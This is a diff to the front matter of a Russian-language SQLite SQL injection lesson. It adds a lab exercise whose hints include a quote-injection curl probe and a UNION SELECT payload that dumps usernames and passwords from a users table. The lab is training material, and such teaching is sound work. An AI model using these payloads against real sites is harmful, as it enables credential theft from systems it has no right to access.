@@ -13,6 +13,18 @@ useful_for:
   - "Десктопные приложения"
 estimated_minutes: 40
 summary: "SQLite от фингерпринта до записи файлов: sqlite_master, PRAGMA, UNION/blind, ATTACH DATABASE и load_extension."
+lab:
+  kind: shell
+  title: 'Практика: SQLite — sqlite_master и дамп учёток'
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md]
+  check: 'grep -q ''nto{'' found.txt'
+  hints:
+    - 'Проверь движок: `curl -s "http://shop.example/product?id=1''"` — ищи `unrecognized token`.'
+    - 'Метаданные SQLite — в `sqlite_master` (а не `information_schema`).'
+    - 'Определи колонки: сравни ответы на `ORDER BY 1..4`.'
+    - 'Дампни `users`: `... UNION SELECT 1,GROUP_CONCAT(username||'':''||password),3 FROM users-- -`.'
 ---
 
 ## Задача
